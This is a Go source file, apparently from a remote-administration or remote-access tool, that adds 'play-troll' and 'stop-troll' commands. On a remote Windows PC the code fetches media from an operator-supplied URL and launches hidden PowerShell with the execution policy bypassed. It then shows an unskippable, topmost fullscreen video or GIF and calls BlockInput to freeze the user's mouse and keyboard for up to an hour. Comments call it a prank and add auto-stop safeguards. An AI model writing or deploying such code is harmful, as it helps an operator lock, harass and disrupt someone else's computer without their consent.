package commands

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
)

// play-troll / stop-troll (v1.45.2): unskippable fullscreen media lockdown.
// Media = local path on the remote PC or http(s) URL (downloaded first).
// Format: MP4/MOV/AVI/WMV (WPF MediaElement) or GIF/animated PNG (WinForms
// ImageAnimator). Window is chrome-less, topmost, no taskbar entry, kills
// Alt+F4 via no-close chrome + re-assert. BlockInput(true) eats mouse+keys
// for the duration (Ctrl+Alt+Del still works — user-mode cannot block SAS).
// SAFETY (non-negotiable): default 300s auto-stop, hard cap 3600s, and the
// player itself unblocks input on close/timeout; stop-troll always kills +
// BlockInput(false) even if the player hung. maxTrollSeconds keeps a dead
// URL from bricking the box.

const (
	defaultTrollSeconds = 300
	maxTrollSeconds     = 3600
)

func trollPIDFile() string {
	if localApp := os.Getenv("LOCALAPPDATA"); localApp != "" {
		return filepath.Join(localApp, "RMM", "troll.pid")
	}
	return filepath.Join(os.TempDir(), "RMM", "troll.pid")
}

func trollMediaDir() string {
	if localApp := os.Getenv("LOCALAPPDATA"); localApp != "" {
		return filepath.Join(localApp, "RMM", "troll")
	}
	return filepath.Join(os.TempDir(), "RMM", "troll")
}

// play-troll <path|url> [seconds] [noloop]
// seconds: 1-3600, default 300. noloop: play once then auto-close.
func playTroll(arg string) (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("not supported on %s", runtime.GOOS)
	}
	fields := strings.Fields(strings.TrimSpace(arg))
	if len(fields) == 0 {
		return "", fmt.Errorf("usage: play-troll <path|url> [seconds 1-3600] [noloop]")
	}
	src := fields[0]
	secs := defaultTrollSeconds
	loop := true
	if len(fields) >= 2 {
		n, err := strconv.Atoi(fields[1])
		if err != nil || n <= 0 {
			return "", fmt.Errorf("usage: play-troll <path|url> [seconds 1-3600] [noloop]")
		}
		if n > maxTrollSeconds {
			n = maxTrollSeconds
		}
		secs = n
	}
	if len(fields) >= 3 && strings.EqualFold(fields[2], "noloop") {
		loop = false
	}

	// Kill any previous troll first (one at a time — lock, not a pile-up).
	stopTrollInternal()

	local := src
	if strings.HasPrefix(src, "http://") || strings.HasPrefix(src, "https://") {
		dl, err := downloadTroll(src)
		if err != nil {
			return "", fmt.Errorf("troll download failed: %w", err)
		}
		local = dl
	}
	if _, err := os.Stat(local); err != nil {
		return "", fmt.Errorf("troll media not found: %s", local)
	}

	ext := strings.ToLower(filepath.Ext(local))
	script, err := trollScript(local, ext, secs, loop)
	if err != nil {
		return "", err
	}
	cmd := hideWindow(exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-command", script))
	if err := cmd.Start(); err != nil {
		return "", err
	}
	_ = os.MkdirAll(filepath.Dir(trollPIDFile()), 0755)
	_ = os.WriteFile(trollPIDFile(), []byte(strconv.Itoa(cmd.Process.Pid)), 0644)
	go cmd.Wait()
	loopNote := "looping"
	if !loop {
		loopNote = "once"
	}
	return fmt.Sprintf("troll playing %s (%s, %ds, input blocked — stop-troll or timeout %ds)", filepath.Base(local), loopNote, secs, secs), nil
}

// stop-troll: unblock input FIRST (survives a hung player), then kill.
func stopTroll() (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("not supported on %s", runtime.GOOS)
	}
	pid, ok := stopTrollInternal()
	if !ok {
		return "no troll running (input already free)", nil
	}
	return fmt.Sprintf("troll stopped (pid %d, input unblocked)", pid), nil
}

// stopTrollInternal unblocks input + kills the player. Returns pid, found.
func stopTrollInternal() (int, bool) {
	// Unblock input even if the player is wedged — BlockInput(false) from
	// any process with the right integrity level clears the desktop lock.
	unblock := `Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public static class RmmTrollBlk {
  [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlock);
}
'@; [void][RmmTrollBlk]::BlockInput($false)`
	_, _ = execPS(unblock)

	pid := 0
	b, err := os.ReadFile(trollPIDFile())
	if err == nil {
		if n, e := strconv.Atoi(strings.TrimSpace(string(b))); e == nil && n > 0 {
			pid = n
		}
	}
	_ = os.Remove(trollPIDFile())
	if pid > 0 {
		_ = hideWindow(exec.Command("taskkill", "/F", "/PID", strconv.Itoa(pid))).Run()
	}
	return pid, pid > 0
}

func downloadTroll(url string) (string, error) {
	dir := trollMediaDir()
	if err := os.MkdirAll(dir, 0755); err != nil {
		return "", err
	}
	name := "m.dat"
	if u := strings.SplitN(strings.SplitN(url, "?", 2)[0], "/", 2); len(u) == 2 && u[1] != "" {
		base := u[1]
		if i := strings.LastIndexByte(base, '/'); i >= 0 {
			base = base[i+1:]
		}
		if base != "" && len(base) < 80 {
			name = base
		}
	}
	dst := filepath.Join(dir, name)
	client := &http.Client{Timeout: 60 * time.Second}
	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return "", err
	}
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("HTTP %d", resp.StatusCode)
	}
	f, err := os.Create(dst)
	if err != nil {
		return "", err
	}
	defer f.Close()
	// 80MB cap: troll media, not an update payload.
	if _, err := io.Copy(f, io.LimitReader(resp.Body, 80<<20)); err != nil {
		return "", err
	}
	return dst, nil
}

// trollScript builds the lockdown player. Branch on media kind:
//   - video extensions → WPF MediaElement fullscreen loop
//   - gif/png → WinForms frame animator / static Image
// Shared: no chrome, TopMost, no taskbar, BlockInput on, timer at `secs`
// that unblocks+closes, Closed handler unblocks again (belt and suspenders
// so a crash mid-drag never leaves input dead).
func trollScript(path, ext string, secs int, loop bool) (string, error) {
	// Embedded via here-string; path single-quoted for PS (psQuote).
	q := psQuote(path)
	isGIF := ext == ".gif" || ext == ".png"
	loopI := 0
	if loop {
		loopI = 1
	}
	if isGIF {
		// WinForms: ImageAnimator handles GIF delay tables; PNG is static.
		return fmt.Sprintf(`Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public static class RmmTrollBlk2 {
  [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlock);
  [DllImport("user32.dll")] public static extern bool SetProcessDPIAware();
}
'@
[void][RmmTrollBlk2]::SetProcessDPIAware()
$path = %s
$secs = %d
$loop = %d
$f = New-Object System.Windows.Forms.Form
$f.Text = ''
$f.FormBorderStyle = 'None'
$f.WindowState = 'Maximized'
$f.TopMost = $true
$f.ShowInTaskbar = $false
$f.StartPosition = 'CenterScreen'
$f.BackColor = [System.Drawing.Color]::Black
$pic = New-Object System.Windows.Forms.PictureBox
$pic.Dock = 'Fill'
$pic.SizeMode = 'Zoom'
$img = [System.Drawing.Image]::FromFile($path)
$pic.Image = $img
$f.Controls.Add($pic)
$frame = 0
$t = New-Object System.Windows.Forms.Timer
$t.Interval = 60
$t.Add_Tick({
  if ($loop -and [System.Drawing.Image]::IsAnimatedImage($img)) {
    $frame = ($frame + 1) %% [System.Drawing.Image]::GetFrameCount([System.Drawing.Imaging.FrameDimension]::Time)
    $img.SelectActiveFrame([System.Drawing.Imaging.FrameDimension]::Time, $frame) | Out-Null
    $pic.Image = $img.Clone()
  }
})
if ($loop) { $t.Start() }
# Hard auto-stop: unblock + close. Fires even if media never opened.
$stop = New-Object System.Windows.Forms.Timer
$stop.Interval = [Math]::Max(1, $secs) * 1000
$stop.Add_Tick({
  [void][RmmTrollBlk2]::BlockInput($false)
  $f.Close()
})
$stop.Start()
$f.Add_FormClosed({ param($s,$e) [void][RmmTrollBlk2]::BlockInput($false); if ($img) { $img.Dispose() } })
# Block input only after the window is up so the player is visible first.
$f.Add_Shown({
  [void][RmmTrollBlk2]::BlockInput($true)
})
[void]$f.ShowDialog()
$f.Dispose()`, q, secs, loopI), nil
	}
	// Video path — WPF MediaElement (MP4/MOV/AVI/WMV/MKV depending on codecs).
	return fmt.Sprintf(`Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName PresentationCore
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public static class RmmTrollBlk {
  [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlock);
  [DllImport("user32.dll")] public static extern bool SetProcessDPIAware();
}
'@
[void][RmmTrollBlk]::SetProcessDPIAware()
$path = %s
$secs = %d
$loop = %d
$uri = (New-Object System.Uri($path)).AbsoluteUri
$w = New-Object System.Windows.Window
$w.Title = ''
$w.WindowStyle = 'None'
$w.ResizeMode = 'NoResize'
$w.WindowState = 'Maximized'
$w.Topmost = $true
$w.ShowInTaskbar = $false
$w.Background = [System.Windows.Media.Brushes]::Black
$w.WindowStartupLocation = 'CenterScreen'
$me = New-Object System.Windows.Controls.MediaElement
$me.Source = $uri
$me.LoadedBehavior = 'Manual'
$me.UnloadedBehavior = 'Manual'
$me.Stretch = 'Uniform'
$me.IsMuted = $false
$w.Content = $me
$me.Add_MediaOpened({ $me.Play() })
if ($loop -eq 1) {
  $me.Add_MediaEnded({
    $me.Position = [TimeSpan]::Zero
    $me.Play()
  })
} else {
  $me.Add_MediaEnded({
    [void][RmmTrollBlk]::BlockInput($false)
    $w.Close()
  })
}
$me.Add_MediaFailed({
  param($s,$e)
  # Poison path: never leave a black locked screen — unblock + bail.
  [void][RmmTrollBlk]::BlockInput($false)
  $w.Close()
})
# Hard auto-stop regardless of media state.
$stopTimer = New-Object System.Windows.Threading.DispatcherTimer
$stopTimer.Interval = New-Object TimeSpan(0,0,0,[Math]::Max(1,$secs),0)
$stopTimer.Add_Tick({
  [void][RmmTrollBlk]::BlockInput($false)
  $w.Close()
})
$stopTimer.Start()
$w.Add_Closed({
  [void][RmmTrollBlk]::BlockInput($false)
  $stopTimer.Stop()
})
$w.Add_Shown({
  [void][RmmTrollBlk]::BlockInput($true)
})
[void]$w.ShowDialog()`, q, secs, loopI), nil
}
